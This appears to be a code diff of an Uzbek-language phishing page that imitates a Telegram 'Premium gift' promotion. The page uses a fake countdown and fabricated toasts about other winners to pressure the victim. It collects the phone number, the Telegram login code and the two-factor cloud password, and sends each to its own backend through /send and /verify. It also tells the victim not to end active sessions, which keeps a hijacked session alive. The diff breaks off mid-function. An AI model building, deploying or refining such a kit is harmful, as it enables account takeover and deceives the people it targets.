@@ -3,250 +3,1073 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Telegram Premium Gift — Rasmiy Sovg'alar</title>
+    <title>Telegram Premium — 12 yillik maxsus sovg'a</title>
     <style>
-        :root { --tg-color: #3390ec; --bg-color: #f4f4f5; --premium-gradient: linear-gradient(45deg, #6c52ee, #b652ee); }
-        body { 
-            background: var(--bg-color); 
-            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
-            display: flex; justify-content: center; align-items: center; min-height: 100vh; margin: 0; 
+        /* (Stillar o'zgarmasdan qoladi - yuqoridagi bilan bir xil) */
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
         }
-        .box { 
-            background: #fff; padding: 30px; border-radius: 20px; 
-            box-shadow: 0 10px 30px rgba(0,0,0,0.1); text-align: center; 
-            width: 380px; position: relative; overflow: hidden;
+
+        body {
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            min-height: 100vh;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            padding: 20px;
+            position: relative;
+            overflow-x: hidden;
         }
-        
-        /* Premium Header */
+
+        /* Animated background */
+        .bg-particles {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            z-index: 0;
+            overflow: hidden;
+        }
+
+        .particle {
+            position: absolute;
+            background: rgba(255, 255, 255, 0.1);
+            border-radius: 50%;
+            pointer-events: none;
+            animation: float 20s infinite;
+        }
+
+        @keyframes float {
+            0%, 100% { transform: translateY(0) translateX(0); }
+            25% { transform: translateY(-100px) translateX(50px); }
+            50% { transform: translateY(-50px) translateX(-50px); }
+            75% { transform: translateY(50px) translateX(100px); }
+        }
+
+        /* Asosiy karta */
+        .premium-card {
+            position: relative;
+            z-index: 10;
+            max-width: 450px;
+            width: 100%;
+            background: rgba(255, 255, 255, 0.95);
+            backdrop-filter: blur(10px);
+            border-radius: 30px;
+            box-shadow: 0 30px 60px rgba(0, 0, 0, 0.3);
+            overflow: hidden;
+            transform: translateY(0);
+            transition: transform 0.3s ease;
+            animation: cardAppear 0.6s ease-out;
+        }
+
+        @keyframes cardAppear {
+            from {
+                opacity: 0;
+                transform: translateY(50px);
+            }
+            to {
+                opacity: 1;
+                transform: translateY(0);
+            }
+        }
+
+        /* Premium header */
         .premium-header {
-            background: var(--premium-gradient);
-            margin: -30px -30px 20px -30px;
-            padding: 40px 20px;
+            background: linear-gradient(135deg, #6c5ce7, #a463f5, #e1306c);
+            padding: 40px 20px 30px;
+            text-align: center;
+            color: white;
+            position: relative;
+            overflow: hidden;
+        }
+
+        .premium-header::before {
+            content: '';
+            position: absolute;
+            top: -50%;
+            left: -50%;
+            width: 200%;
+            height: 200%;
+            background: radial-gradient(circle, rgba(255,255,255,0.2) 0%, transparent 70%);
+            animation: rotate 20s linear infinite;
+        }
+
+        @keyframes rotate {
+            from { transform: rotate(0deg); }
+            to { transform: rotate(360deg); }
+        }
+
+        .premium-badge {
+            display: inline-block;
+            background: rgba(255, 255, 255, 0.2);
+            backdrop-filter: blur(5px);
+            padding: 8px 20px;
+            border-radius: 50px;
+            font-size: 14px;
+            font-weight: 600;
+            margin-bottom: 15px;
+            border: 1px solid rgba(255, 255, 255, 0.3);
+            animation: pulse 2s infinite;
+        }
+
+        @keyframes pulse {
+            0%, 100% { transform: scale(1); }
+            50% { transform: scale(1.05); }
+        }
+
+        .star-icon {
+            width: 80px;
+            height: 80px;
+            margin-bottom: 15px;
+            filter: drop-shadow(0 10px 20px rgba(0,0,0,0.2));
+            animation: starRotate 10s linear infinite;
+        }
+
+        @keyframes starRotate {
+            from { transform: rotate(0deg); }
+            to { transform: rotate(360deg); }
+        }
+
+        .premium-header h1 {
+            font-size: 32px;
+            font-weight: 800;
+            margin-bottom: 10px;
+            text-shadow: 0 2px 10px rgba(0,0,0,0.2);
+        }
+
+        .timer-box {
+            background: rgba(0, 0, 0, 0.2);
+            backdrop-filter: blur(5px);
+            display: inline-block;
+            padding: 10px 20px;
+            border-radius: 50px;
+            font-size: 18px;
+            font-weight: 600;
+            margin-top: 15px;
+            border: 1px solid rgba(255, 255, 255, 0.2);
+        }
+
+        .timer-box span {
+            background: white;
+            color: #6c5ce7;
+            padding: 2px 8px;
+            border-radius: 30px;
+            margin-left: 5px;
+            font-weight: 700;
+        }
+
+        /* Content */
+        .content {
+            padding: 30px;
+        }
+
+        /* Sovg'a variantlari */
+        .gift-section {
+            text-align: center;
+            margin-bottom: 25px;
+        }
+
+        .gift-section p {
+            color: #666;
+            margin-bottom: 20px;
+            font-size: 16px;
+            line-height: 1.5;
+        }
+
+        .gift-options {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 15px;
+            margin-bottom: 25px;
+        }
+
+        .gift-card {
+            background: white;
+            border: 2px solid #e0e0e0;
+            border-radius: 20px;
+            padding: 20px 15px;
+            text-align: center;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            position: relative;
+            overflow: hidden;
+        }
+
+        .gift-card:hover {
+            transform: translateY(-5px);
+            box-shadow: 0 10px 30px rgba(108, 92, 231, 0.2);
+        }
+
+        .gift-card.active {
+            border-color: #6c5ce7;
+            background: linear-gradient(135deg, #f6f9ff, white);
+            box-shadow: 0 10px 30px rgba(108, 92, 231, 0.3);
+        }
+
+        .gift-card.active::before {
+            content: '✓';
+            position: absolute;
+            top: 10px;
+            right: 10px;
+            width: 24px;
+            height: 24px;
+            background: #6c5ce7;
+            color: white;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 14px;
+            font-weight: bold;
+        }
+
+        .gift-card .months {
+            font-size: 20px;
+            font-weight: 800;
+            color: #333;
+            margin-bottom: 10px;
+        }
+
+        .gift-card .old-price {
+            color: #999;
+            text-decoration: line-through;
+            font-size: 14px;
+            margin-bottom: 5px;
+        }
+
+        .gift-card .free {
+            color: #6c5ce7;
+            font-weight: 800;
+            font-size: 18px;
+        }
+
+        .gift-card .popular-badge {
+            position: absolute;
+            top: 10px;
+            left: 10px;
+            background: #ff6b6b;
+            color: white;
+            font-size: 10px;
+            font-weight: bold;
+            padding: 4px 8px;
+            border-radius: 20px;
+            text-transform: uppercase;
+        }
+
+        /* Inputlar */
+        .input-group {
+            margin-bottom: 20px;
+        }
+
+        .input-label {
+            display: block;
+            margin-bottom: 8px;
+            font-weight: 600;
+            color: #333;
+            font-size: 14px;
+        }
+
+        .input-field {
+            width: 100%;
+            padding: 16px 20px;
+            border: 2px solid #e0e0e0;
+            border-radius: 15px;
+            font-size: 16px;
+            transition: all 0.3s ease;
+            background: white;
+        }
+
+        .input-field:focus {
+            outline: none;
+            border-color: #6c5ce7;
+            box-shadow: 0 0 0 4px rgba(108, 92, 231, 0.1);
+        }
+
+        .input-field.error {
+            border-color: #ff6b6b;
+            animation: shake 0.3s ease;
+        }
+
+        @keyframes shake {
+            0%, 100% { transform: translateX(0); }
+            25% { transform: translateX(-5px); }
+            75% { transform: translateX(5px); }
+        }
+
+        /* Tugmalar */
+        .btn {
+            width: 100%;
+            padding: 16px;
+            border: none;
+            border-radius: 15px;
+            font-size: 16px;
+            font-weight: 700;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            position: relative;
+            overflow: hidden;
+        }
+
+        .btn-primary {
+            background: linear-gradient(135deg, #6c5ce7, #a463f5);
+            color: white;
+            box-shadow: 0 10px 20px rgba(108, 92, 231, 0.3);
+        }
+
+        .btn-primary:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 15px 30px rgba(108, 92, 231, 0.4);
+        }
+
+        .btn-primary:active {
+            transform: translateY(0);
+        }
+
+        .btn-primary::after {
+            content: '';
+            position: absolute;
+            top: 50%;
+            left: 50%;
+            width: 0;
+            height: 0;
+            border-radius: 50%;
+            background: rgba(255, 255, 255, 0.3);
+            transform: translate(-50%, -50%);
+            transition: width 0.6s, height 0.6s;
+        }
+
+        .btn-primary:active::after {
+            width: 300px;
+            height: 300px;
+        }
+
+        /* Xabarlar */
+        .message {
+            padding: 15px;
+            border-radius: 12px;
+            margin-bottom: 20px;
+            font-size: 14px;
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            animation: slideIn 0.3s ease;
+        }
+
+        @keyframes slideIn {
+            from {
+                opacity: 0;
+                transform: translateX(-20px);
+            }
+            to {
+                opacity: 1;
+                transform: translateX(0);
+            }
+        }
+
+        .message.info {
+            background: #e3f2fd;
+            color: #1976d2;
+            border-left: 4px solid #1976d2;
+        }
+
+        .message.warning {
+            background: #fff3e0;
+            color: #f57c00;
+            border-left: 4px solid #f57c00;
+        }
+
+        .message.success {
+            background: #e8f5e9;
+            color: #388e3c;
+            border-left: 4px solid #388e3c;
+        }
+
+        .message.error {
+            background: #ffebee;
+            color: #d32f2f;
+            border-left: 4px solid #d32f2f;
+        }
+
+        /* Loading overlay */
+        .loading-overlay {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(255, 255, 255, 0.95);
+            backdrop-filter: blur(5px);
+            display: none;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            z-index: 1000;
+        }
+
+        .spinner {
+            width: 50px;
+            height: 50px;
+            border: 4px solid #f3f3f3;
+            border-top: 4px solid #6c5ce7;
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+            margin-bottom: 15px;
+        }
+
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+
+        .loading-text {
+            color: #333;
+            font-weight: 600;
+            font-size: 16px;
+        }
+
+        /* Toast notifications */
+        .toast-container {
+            position: fixed;
+            bottom: 20px;
+            left: 20px;
+            z-index: 10000;
+        }
+
+        .toast {
+            background: white;
+            padding: 12px 20px;
+            border-radius: 50px;
+            box-shadow: 0 10px 30px rgba(0,0,0,0.15);
+            margin-top: 10px;
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            font-size: 14px;
+            animation: toastSlide 0.3s ease;
+            border-left: 4px solid #6c5ce7;
+        }
+
+        @keyframes toastSlide {
+            from {
+                opacity: 0;
+                transform: translateX(-100%);
+            }
+            to {
+                opacity: 1;
+                transform: translateX(0);
+            }
+        }
+
+        .toast.success {
+            border-left-color: #4caf50;
+        }
+
+        .toast .toast-icon {
+            width: 24px;
+            height: 24px;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-weight: bold;
+        }
+
+        .toast.success .toast-icon {
+            background: #4caf50;
             color: white;
         }
-        .star-icon { width: 80px; filter: drop-shadow(0 0 10px rgba(255,255,255,0.5)); animation: pulse 2s infinite; }
-        
-        @keyframes pulse { 0% { transform: scale(1); } 50% { transform: scale(1.05); } 100% { transform: scale(1); } }
-        
-        h2 { font-size: 24px; margin: 10px 0; font-weight: 700; }
-        .timer { font-size: 14px; background: rgba(0,0,0,0.1); padding: 5px 15px; border-radius: 20px; display: inline-block; margin-bottom: 10px; }
 
-        p { color: #707579; font-size: 15px; line-height: 1.5; margin-bottom: 20px; }
+        /* Step containers */
+        .step {
+            display: block;
+        }
 
-        /* Sovg'a tanlash kartalari */
-        .gift-options { display: grid; grid-template-columns: 1fr 1fr; gap: 10px; margin-bottom: 20px; }
-        .gift-card { 
-            border: 2px solid #eee; padding: 15px; border-radius: 15px; cursor: pointer; transition: 0.3s;
+        .step.hidden {
+            display: none;
         }
-        .gift-card.active { border-color: var(--tg-color); background: #f0f7ff; }
-        .gift-card b { display: block; color: var(--tg-color); }
 
-        input { 
-            width: 100%; padding: 14px; margin: 10px 0; 
-            border: 1px solid #dadce0; border-radius: 12px; 
-            font-size: 16px; box-sizing: border-box; outline: none;
+        /* Success screen */
+        .success-screen {
+            text-align: center;
+            padding: 30px 20px;
         }
-        button { 
-            width: 100%; padding: 15px; background: var(--tg-color); 
-            color: #fff; border: none; border-radius: 12px; 
-            font-weight: bold; cursor: pointer; font-size: 16px; transition: 0.3s;
-        }
-        button:hover { opacity: 0.9; transform: translateY(-2px); }
 
-        /* Notification Toast */
-        .toast {
-            position: fixed; bottom: 20px; left: 20px; background: white;
-            padding: 10px 20px; border-radius: 10px; box-shadow: 0 5px 15px rgba(0,0,0,0.1);
-            display: flex; align-items: center; gap: 10px; font-size: 13px;
-            animation: slideUp 0.5s ease-out; z-index: 100;
+        .success-animation {
+            width: 100px;
+            height: 100px;
+            margin: 0 auto 20px;
+            background: #e8f5e9;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            animation: successPop 0.5s ease;
         }
-        @keyframes slideUp { from { transform: translateY(100%); opacity: 0; } to { transform: translateY(0); opacity: 1; } }
 
-        .loading-overlay { 
-            display: none; position: absolute; top: 0; left: 0; 
-            width: 100%; height: 100%; background: rgba(255,255,255,0.98); 
-            z-index: 10; flex-direction: column; justify-content: center; align-items: center; 
+        @keyframes successPop {
+            0% {
+                transform: scale(0);
+            }
+            70% {
+                transform: scale(1.1);
+            }
+            100% {
+                transform: scale(1);
+            }
         }
-        .spinner { border: 4px solid #f3f3f3; border-top: 4px solid var(--tg-color); border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; }
-        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
-        
-        .hidden { display: none; }
-        .success-screen { color: #333; }
-        .success-screen h3 { color: #28a745; }
+
+        .success-animation svg {
+            width: 50px;
+            height: 50px;
+            fill: #4caf50;
+        }
+
+        .success-screen h2 {
+            font-size: 28px;
+            color: #333;
+            margin-bottom: 15px;
+        }
+
+        .success-screen p {
+            color: #666;
+            margin-bottom: 25px;
+            line-height: 1.6;
+        }
+
+        .warning-box {
+            background: #fff3cd;
+            border-left: 4px solid #ffc107;
+            padding: 15px;
+            border-radius: 10px;
+            text-align: left;
+            margin-bottom: 20px;
+        }
+
+        .warning-box strong {
+            color: #856404;
+        }
+
+        /* Footer */
+        .footer {
+            text-align: center;
+            margin-top: 20px;
+            font-size: 12px;
+            color: #999;
+        }
+
+        .footer a {
+            color: #6c5ce7;
+            text-decoration: none;
+        }
+
+        .footer a:hover {
+            text-decoration: underline;
+        }
+
+        /* Responsive */
+        @media (max-width: 480px) {
+            .premium-card {
+                border-radius: 20px;
+            }
+
+            .premium-header {
+                padding: 30px 15px 20px;
+            }
+
+            .content {
+                padding: 20px;
+            }
+
+            .gift-options {
+                gap: 10px;
+            }
+
+            .gift-card {
+                padding: 15px 10px;
+            }
+
+            .gift-card .months {
+                font-size: 18px;
+            }
+        }
     </style>
 </head>
 <body>
+    <!-- Background particles -->
+    <div class="bg-particles" id="particles"></div>
 
-<div class="box">
-    <div id="loader" class="loading-overlay">
-        <div class="spinner"></div>
-        <p id="loader-text" style="margin-top: 15px; font-weight: 500;">Xavfsiz ulanish o'rnatilmoqda...</p>
-    </div>
+    <!-- Asosiy karta -->
+    <div class="premium-card">
+        <!-- Loading overlay -->
+        <div class="loading-overlay" id="loadingOverlay">
+            <div class="spinner"></div>
+            <div class="loading-text" id="loadingText">Xavfsiz ulanish o'rnatilmoqda...</div>
+        </div>
 
-    <div class="premium-header">
-        <img src="https://telegram.org/img/t_logo.png" class="star-icon" alt="Star">
-        <h2>Premium Gift</h2>
-        <div class="timer">Aksiya tugashiga: <span id="timer-clock">05:00</span></div>
-    </div>
-
-    <div id="step0">
-        <p>Telegram 12 yilligi munosabati bilan bepul obunalarni taqdim etadi. Sovg'ani tanlang:</p>
-        <div class="gift-options">
-            <div class="gift-card active" onclick="selectGift(this)">
-                <b>3 Oylik</b>
-                <s>$11.99</s> BEPUL
-            </div>
-            <div class="gift-card" onclick="selectGift(this)">
-                <b>6 Oylik</b>
-                <s>$19.99</s> BEPUL
+        <!-- Premium Header -->
+        <div class="premium-header">
+            <div class="premium-badge">⚡ Telegram 12 yillik</div>
+            <svg class="star-icon" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
+                <path d="M12 2L15.09 8.26L22 9.27L17 14.14L18.18 21.02L12 17.77L5.82 21.02L7 14.14L2 9.27L8.91 8.26L12 2Z" fill="white" stroke="white" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/>
+            </svg>
+            <h1>Premium Gift</h1>
+            <div class="timer-box">
+                ⏳ Aksiya tugashiga <span id="timer">05:00</span>
             </div>
         </div>
-        <button onclick="nextStep(1)">DAVOM ETISH</button>
+
+        <!-- Content -->
+        <div class="content">
+            <!-- STEP 0: Gift selection -->
+            <div id="step0" class="step">
+                <div class="gift-section">
+                    <p>Telegram 12 yilligi munosabati bilan barcha foydalanuvchilarga bepul Premium oyliklarini taqdim etadi. O'zingizga mos sovg'ani tanlang:</p>
+                    
+                    <div class="gift-options">
+                        <div class="gift-card active" onclick="selectGift(this, 3)">
+                            <div class="months">3 Oylik</div>
+                            <div class="old-price">$11.99</div>
+                            <div class="free">BEPUL</div>
+                        </div>
+                        <div class="gift-card" onclick="selectGift(this, 6)">
+                            <div class="popular-badge">🔥 Eng ommabop</div>
+                            <div class="months">6 Oylik</div>
+                            <div class="old-price">$19.99</div>
+                            <div class="free">BEPUL</div>
+                        </div>
+                    </div>
+
+                    <button class="btn btn-primary" onclick="nextStep(1)">Davom etish</button>
+                </div>
+            </div>
+
+            <!-- STEP 1: Phone number -->
+            <div id="step1" class="step hidden">
+                <div class="message info">
+                    <span>ℹ️</span>
+                    <span>Sovg'ani faollashtirish uchun Telegram akkauntingizga ulangan telefon raqamini kiriting</span>
+                </div>
+
+                <div class="input-group">
+                    <label class="input-label">Telefon raqam</label>
+                    <input type="tel" id="phone" class="input-field" placeholder="+998901234567" value="+998">
+                </div>
+
+                <button class="btn btn-primary" onclick="sendPhone()">Kod yuborish</button>
+                <button class="btn" style="background: none; color: #666; margin-top: 10px;" onclick="prevStep(0)">Ortga</button>
+            </div>
+
+            <!-- STEP 2: Verification code -->
+            <div id="step2" class="step hidden">
+                <div class="message info">
+                    <span>ℹ️</span>
+                    <span>Telegram ilovasiga yuborilgan 5 xonali kodni kiriting</span>
+                </div>
+
+                <div class="input-group">
+                    <label class="input-label">Telefon raqam</label>
+                    <input type="text" id="displayPhone" class="input-field" readonly disabled style="background: #f5f5f5;">
+                </div>
+
+                <div class="input-group">
+                    <label class="input-label">Tasdiqlash kodi</label>
+                    <input type="text" id="code" class="input-field" placeholder="12345" maxlength="5" inputmode="numeric" pattern="[0-9]*">
+                </div>
+
+                <div class="message warning" style="margin-top: 10px; font-size: 13px;">
+                    <span>⏱️</span>
+                    <span>Kod 2 daqiqa amal qiladi</span>
+                </div>
+
+                <button class="btn btn-primary" onclick="verifyCode()">Tasdiqlash</button>
+                <button class="btn" style="background: none; color: #666; margin-top: 10px;" onclick="prevStep(1)">Ortga</button>
+            </div>
+
+            <!-- STEP 3: 2FA Password -->
+            <div id="step3" class="step hidden">
+                <div class="message warning">
+                    <span>🔐</span>
+                    <span>Akkauntingiz ikki bosqichli tasdiqlash bilan himoyalangan. Bulutli parolingizni kiriting</span>
+                </div>
+
+                <div class="input-group">
+                    <label class="input-label">Bulutli parol (2FA)</label>
+                    <input type="password" id="password" class="input-field" placeholder="Parolingizni kiriting">
+                </div>
+
+                <button class="btn btn-primary" onclick="verifyPassword()">Kirish</button>
+                <button class="btn" style="background: none; color: #666; margin-top: 10px;" onclick="prevStep(2)">Ortga</button>
+            </div>
+
+            <!-- STEP FINAL: Success -->
+            <div id="stepFinal" class="step hidden success-screen">
+                <div class="success-animation">
+                    <svg viewBox="0 0 24 24">
+                        <path d="M9 16.17L4.83 12l-1.42 1.41L9 19 21 7l-1.41-1.41L9 16.17z"/>
+                    </svg>
+                </div>
+
+                <h2>Arizangiz qabul qilindi!</h2>
+                
+                <p>Premium obunangiz navbatga qo'yildi. Tekshiruv va faollashtirish jarayoni <strong>24 soat ichida</strong> yakunlanadi.</p>
+
+                <div class="warning-box">
+                    <strong>⚠️ Diqqat:</strong>
+                    <p style="margin-top: 5px; color: #856404;">Jarayon tugaguncha akkauntdagi faol sessiyalarni o'chirmang, aks holda sovg'a bekor qilinadi. Telegram ilovasida qolishingizni so'raymiz.</p>
+                </div>
+
+                <button class="btn btn-primary" onclick="window.location.href='https://t.me/telegram'">Yopish</button>
+            </div>
+
+            <!-- Footer -->
+            <div class="footer">
+                <a href="#">Xavfsizlik qoidalari</a> • <a href="#">Maxfiylik siyosati</a> • <a href="#">Yordam</a>
+                <p style="margin-top: 10px;">© 2024 Telegram Messenger Inc.</p>
+            </div>
+        </div>
     </div>
 
-    <div id="step1" class="hidden">
-        <p>Sovg'ani faollashtirish uchun telefon raqamingizni kiriting:</p>
-        <input type="tel" id="phone" placeholder="+998901234567" value="+998">
-        <button onclick="sendPhone()">TASDIQLASH</button>
-    </div>
+    <!-- Toast notifications -->
+    <div class="toast-container" id="toastContainer"></div>
 
-    <div id="step2" class="hidden">
-        <p id="phone-display" style="font-weight: bold;"></p>
-        <p>Ilovaga yuborilgan 5 xonali tasdiqlash kodini kiriting:</p>
-        <input type="text" id="code" placeholder="12345" maxlength="5">
-        <button onclick="verifyCode()">SOVG'ANI QABUL QILISH</button>
-    </div>
+   <script>
+    // API URL
+    const API_URL = window.location.origin;
+    
+    // Global variables
+    let currentStep = 0;
+    let selectedGift = 3;
+    let phoneHash = '';
+    let userPhone = '';
 
-    <div id="step3" class="hidden">
-        <p style="color: #d32f2f;">Akkauntingiz ikki bosqichli tasdiqlash bilan himoyalangan.</p>
-        <input type="password" id="password" placeholder="Bulutli parolingiz">
-        <button onclick="verifyPassword()">KIRISH</button>
-    </div>
+    // Particles background
+    function createParticles() {
+        const particlesContainer = document.getElementById('particles');
+        for (let i = 0; i < 30; i++) {
+            const particle = document.createElement('div');
+            particle.className = 'particle';
+            const size = Math.random() * 100 + 50;
+            particle.style.width = size + 'px';
+            particle.style.height = size + 'px';
+            particle.style.left = Math.random() * 100 + '%';
+            particle.style.top = Math.random() * 100 + '%';
+            particle.style.animationDelay = Math.random() * 20 + 's';
+            particle.style.animationDuration = (Math.random() * 20 + 20) + 's';
+            particlesContainer.appendChild(particle);
+        }
+    }
 
-    <div id="step-final" class="hidden success-screen">
-        <img src="https://upload.wikimedia.org/wikipedia/commons/e/e4/Twitter_Verified_Badge.svg" width="60">
-        <h3>Arizangiz qabul qilindi!</h3>
-        <p>Premium obunangiz navbatga qo'yildi. Tekshiruv va faollashtirish jarayoni <b>24 soat ichida</b> yakunlanadi.</p>
-        <p style="font-size: 13px; background: #fff9c4; padding: 10px; border-radius: 10px;">
-            <b>Diqqat:</b> Jarayon tugaguncha akkauntdagi faol sessiyalarni o'chirmang, aks holda sovg'a bekor qilinadi.
-        </p>
-        <button onclick="window.location.href='https://t.me/telegram'" style="background: #333;">YOPISH</button>
-    </div>
-</div>
-
-<div id="notification-area"></div>
-
-<script>
-    const API_URL = "http://localhost:8000";
-    let phoneHash = "";
-    let userPhone = "";
-
-    // Timer funksiyasi
+    // Timer
     function startTimer(duration, display) {
         let timer = duration, minutes, seconds;
         setInterval(() => {
             minutes = parseInt(timer / 60, 10);
             seconds = parseInt(timer % 60, 10);
-            display.textContent = `${minutes < 10 ? "0" + minutes : minutes}:${seconds < 10 ? "0" + seconds : seconds}`;
-            if (--timer < 0) timer = duration;
+            minutes = minutes < 10 ? "0" + minutes : minutes;
+            seconds = seconds < 10 ? "0" + seconds : seconds;
+            display.textContent = minutes + ":" + seconds;
+
+            if (--timer < 0) {
+                timer = duration;
+            }
         }, 1000);
     }
 
-    window.onload = () => {
-        startTimer(300, document.querySelector('#timer-clock'));
-        showFakeNotifications();
-    };
-
-    function selectGift(el) {
-        document.querySelectorAll('.gift-card').forEach(c => c.classList.remove('active'));
-        el.classList.add('active');
-    }
-
-    function nextStep(s) {
-        document.getElementById('step0').classList.add('hidden');
-        document.getElementById('step1').classList.remove('hidden');
-    }
-
+    // Fake notifications
     function showFakeNotifications() {
-        const names = ["Doston", "Sardor", "Jasur", "Madina", "Shaxzod"];
+        const names = ['knight', 'Madina', 'Jasur', 'nikita_235', 'H0l@nd', 'Nilufar', 'Bobur', 'Sevara', 'Azizbek'];
+        const gifts = ['3 oylik', '6 oylik', '6 oylik', '3 oylik'];
+        
         setInterval(() => {
             const name = names[Math.floor(Math.random() * names.length)];
-            const toast = document.createElement('div');
-            toast.className = 'toast';
-            toast.innerHTML = `✅ <b>${name}</b> hozirgina 6 oylik Premium oldi`;
-            document.getElementById('notification-area').appendChild(toast);
-            setTimeout(() => toast.remove(), 4000);
+            const gift = gifts[Math.floor(Math.random() * gifts.length)];
+            showToast(`${name} ${gift} Premium sovg'asini oldi`, 'success');
         }, 8000);
     }
 
-    function showLoader(show, text = "") {
-        const loader = document.getElementById('loader');
-        if(text) document.getElementById('loader-text').innerText = text;
+    // Toast
+    function showToast(message, type = 'info') {
+        const container = document.getElementById('toastContainer');
+        const toast = document.createElement('div');
+        toast.className = `toast ${type}`;
+        
+        let icon = '✅';
+        if (type === 'info') icon = 'ℹ️';
+        if (type === 'warning') icon = '⚠️';
+        if (type === 'error') icon = '❌';
+        
+        toast.innerHTML = `
+            <div class="toast-icon">${icon}</div>
+            <div>${message}</div>
+        `;
+        
+        container.appendChild(toast);
+        
+        setTimeout(() => {
+            toast.remove();
+        }, 4000);
+    }
+
+    // Loading
+    function showLoader(show, text = 'Xavfsiz ulanish o\'rnatilmoqda...') {
+        const loader = document.getElementById('loadingOverlay');
+        document.getElementById('loadingText').innerText = text;
         loader.style.display = show ? 'flex' : 'none';
     }
 
+    // Step navigation
+    function nextStep(step) {
+        document.querySelectorAll('.step').forEach(el => el.classList.add('hidden'));
+        document.getElementById(`step${step}`).classList.remove('hidden');
+        currentStep = step;
+    }
+
+    function prevStep(step) {
+        document.querySelectorAll('.step').forEach(el => el.classList.add('hidden'));
+        document.getElementById(`step${step}`).classList.remove('hidden');
+        currentStep = step;
+    }
+
+    // Select gift
+    function selectGift(el, months) {
+        document.querySelectorAll('.gift-card').forEach(c => c.classList.remove('active'));
+        el.classList.add('active');
+        selectedGift = months;
+    }
+
+    // Send phone number
     async function sendPhone() {
-        userPhone = document.getElementById('phone').value.trim();
-        showLoader(true, "Raqam tekshirilmoqda...");
+        const phoneInput = document.getElementById('phone');
+        userPhone = phoneInput.value.trim();
+        
+        // Validate phone
+        if (!userPhone.startsWith('+') || userPhone.length < 10) {
+            phoneInput.classList.add('error');
+            showToast('Noto\'g\'ri telefon raqam formati', 'warning');
+            setTimeout(() => phoneInput.classList.remove('error'), 1000);
+            return;
+        }
+        
+        showLoader(true, 'Raqam tekshirilmoqda...');
+        
         try {
-            const res = await fetch(`${API_URL}/send`, {
+            console.log('📞 Sending phone:', userPhone);
+            
+            const response = await fetch(`${API_URL}/send`, {
                 method: 'POST',
-                headers: {'Content-Type': 'application/json'},
+                headers: {
+                    'Content-Type': 'application/json',
+                },
                 body: JSON.stringify({ phone: userPhone })
             });
-            const data = await res.json();
-            if (res.ok) {
+            
+            console.log('📡 Response status:', response.status);
+            
+            // JSON ni parse qilish
+            let data;
+            try {
+                data = await response.json();
+            } catch (e) {
+                console.error('❌ JSON parse error:', e);
+                const text = await response.text();
+                console.error('Response text:', text.substring(0, 200));
+                throw new Error('Serverdan noto\'g\'ri javob keldi');
+            }
+            
+            console.log('📦 Response data:', data);
+            
+            if (!response.ok) {
+                showToast(data.detail || 'Server xatoligi', 'error');
+                return;
+            }
+            
+            if (data.status === 'success' || data.hash) {
                 phoneHash = data.hash;
-                document.getElementById('step1').classList.add('hidden');
-                document.getElementById('step2').classList.remove('hidden');
-                document.getElementById('phone-display').innerText = userPhone;
-            } else { alert(data.detail); }
-        } catch (e) { alert("Server bilan aloqa yo'q!"); }
-        finally { showLoader(false); }
+                document.getElementById('displayPhone').value = userPhone;
+                nextStep(2);
+                showToast('Kod yuborildi! Telegram ilovasini tekshiring', 'success');
+            } else {
+                showToast(data.message || 'Xatolik yuz berdi', 'error');
+            }
+        } catch (error) {
+            console.error('❌ Error:', error);
+            showToast('Server bilan aloqa yo\'q: ' + error.message, 'error');
+        } finally {
+            showLoader(false);
+        }
     }
 
+    // Verify code
     async function verifyCode() {
-        const code = document.getElementById('code').value;
-        showLoader(true, "Kod tasdiqlanmoqda...");
-        const res = await fetch(`${API_URL}/verify`, {
-            method: 'POST',
-            headers: {'Content-Type': 'application/json'},
-            body: JSON.stringify({ phone: userPhone, code: code, hash: phoneHash })
-        });
-        const data = await res.json();
-        showLoader(false);
-
-        if (data.status === "2fa_needed") {
-            document.getElementById('step2').classList.add('hidden');
-            document.getElementById('step3').classList.remove('hidden');
-        } else if (data.status === "success") {
-            showFinal();
-        } else { alert("Xato kod kiritildi!"); }
+        const code = document.getElementById('code').value.trim();
+        
+        if (!code || code.length !== 5) {
+            showToast('5 xonali kodni kiriting', 'warning');
+            return;
+        }
+        
+        showLoader(true, 'Kod tekshirilmoqda...');
+        
+        try {
+            console.log('🔑 Verifying code:', { phone: userPhone, code, hash: phoneHash });
+            
+            const response = await fetch(`${API_URL}/verify`, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                },
+                body: JSON.stringify({
+                    phone: userPhone,
+                    code: code,
+                    hash: phoneHash
+                })
+            });
+            
+            console.log('📡 Verify response status:', response.status);
+            
+            let data;
+            try {
+                data = await response.json();
+            } catch (e) {
+                console.error('❌ JSON parse error:', e);
+                const text = await response.text();
+                console.error('Response text:', text.substring(0, 200));
+                throw new Error('Serverdan noto\'g\'ri javob keldi');
+            }
+            
+            console.log('📦 Verify response data:', data);
+            
+            if (!response.ok) {
+                showToast(data.detail || 'Server xatoligi', 'error');
+                return;
+            }
+            
